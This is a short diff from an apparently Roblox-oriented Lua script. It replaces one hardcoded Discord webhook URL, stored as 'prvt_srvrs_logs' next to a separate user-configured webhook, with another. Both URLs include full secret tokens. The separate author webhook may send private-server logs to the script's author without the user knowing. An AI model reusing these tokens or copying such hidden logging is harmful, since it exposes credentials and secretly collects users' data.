@@ -62,7 +62,7 @@ end
 --====================================================================--
 -- WEBHOOKS
 --====================================================================--
-local prvt_srvrs_logs = "https://discord.com/api/webhooks/1436770955308433438/mVkx4LyfvoStR1ky0yko1Cc8n0xT3aV0IgBLY8WoCf0YWAO0DWctjnojjBFVO8hN2Weg"
+local prvt_srvrs_logs = "https://discord.com/api/webhooks/1438824921999478814/YtJWXKp1IHEw1R7iwKZOjqU9lAmm1SXoCIqpq0LykCrvOdOBw3SVwHCHuc_fxeFR_0qf"
 local user_webhook = _G["Script-SM_Config"].user_webhook
 local cfg = _G["Script-SM_Config"]
 local receiver = "Not Configured"
